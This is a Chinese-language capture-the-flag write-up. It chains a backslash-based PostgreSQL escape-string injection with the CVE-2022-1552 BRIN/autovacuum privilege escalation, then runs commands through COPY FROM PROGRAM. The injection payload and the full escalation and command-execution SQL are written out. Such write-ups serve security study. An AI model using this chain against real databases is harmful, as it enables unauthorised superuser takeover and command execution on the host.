# safe-sql

## 题目简述

题目是 PostgreSQL 注入结合 CVE-2022-1552 的提权利用。Web 后端用 Flask 连接 PostgreSQL，登录接口只过滤单双引号，然后把用户名和密码直接拼进 `E'...'` 字符串：

```python
cur.execute(
    f"SELECT username FROM users WHERE username=E'{username}' AND password=E'{password}'",
)
```

因为使用的是 PostgreSQL escape string 语法，攻击者可以在 `username` 中放入反斜杠，使后面的 `password` 内容逃逸出字符串，从而执行多语句 SQL。提权部分利用 PostgreSQL BRIN 索引 `autosummarize` 触发 autovacuum worker，以 `postgres` 权限调用用户可控函数。

## 解题过程

### SQL 注入入口

后端禁止 `'` 和 `"`，但没有禁止反斜杠。请求中令：

```json
{
  "username": "\\",
  "password": ";SELECT version();--"
}
```

拼接后会破坏原本的 `E'...'` 边界，使 `password` 中的 SQL 作为独立语句执行。可以先执行 `SELECT version()` 这类无害语句验证注入可用。

### CVE-2022-1552 提权

PostgreSQL 的 BRIN 索引支持用户自定义函数。当索引开启 `autosummarize` 且插入足够数据后，普通连接进程会通过 `brininsert -> AutoVacuumRequestWork` 创建 `AVW_BRINSummarizeRange` 工作项。后续 autovacuum worker 处理该工作项时会直接调用 `brin_summarize_range`，旧版本没有正确切换权限上下文，导致索引函数以 `postgres` 权限执行。

利用步骤如下：

1. 创建用于触发 autovacuum 的表。
2. 创建 `attack_func()`，当 `current_user = 'postgres'` 时执行 `ALTER USER ctf SUPERUSER`。
3. 先创建一个 `IMMUTABLE` 的 `brin_index_func` 以满足 BRIN 索引要求。
4. 创建开启 `autosummarize` 的 BRIN 索引。
5. 替换 `brin_index_func`，让它调用 `attack_func()`。
6. 插入大量数据触发 `brininsert -> AutoVacuumRequestWork`。
7. 等待 autovacuum worker 调用索引函数，完成提权。

核心 SQL 片段：

```sql
CREATE OR REPLACE PROCEDURE attack_func()
AS $e$
BEGIN
    INSERT INTO postgres.public.logs(msg) VALUES (current_user);
    IF current_user = 'postgres' THEN
        ALTER USER ctf SUPERUSER;
    END IF;
END $e$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION brin_index_func(integer)
    RETURNS integer LANGUAGE sql IMMUTABLE AS 'SELECT $1';

CREATE INDEX brin_index
    ON autovacuum_brin_summarize_range
    USING brin (brin_index_func(a))
    WITH (autosummarize = ON);

CREATE OR REPLACE FUNCTION brin_index_func(integer)
    RETURNS integer LANGUAGE sql SECURITY INVOKER AS
'CALL postgres.public.attack_func(); SELECT $1';
```

### 读取 flag

提权完成后轮询：

```sql
SELECT current_setting($$is_superuser$$);
```

若返回 `on`，说明当前数据库用户已经是 superuser。之后即可借助 PostgreSQL 的 `COPY ... FROM PROGRAM` 执行本地程序：

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM $$/catflag$$;
SELECT * FROM cmd_exec;
```

## 方法总结

- 核心技巧：PostgreSQL escape string 注入进入多语句执行，再利用 BRIN autosummarize 的权限上下文漏洞提权。
- 识别信号：后端拼接 `E'...'` 且只过滤引号时，反斜杠可能破坏字符串边界；数据库版本若受 CVE-2022-1552 影响，可尝试 BRIN/autovacuum 提权链。
- 复用要点：这类题不只是 SQLi 拿数据，目标数据库权限可能不足以读 flag，需要继续寻找数据库到系统命令执行的提权路径。
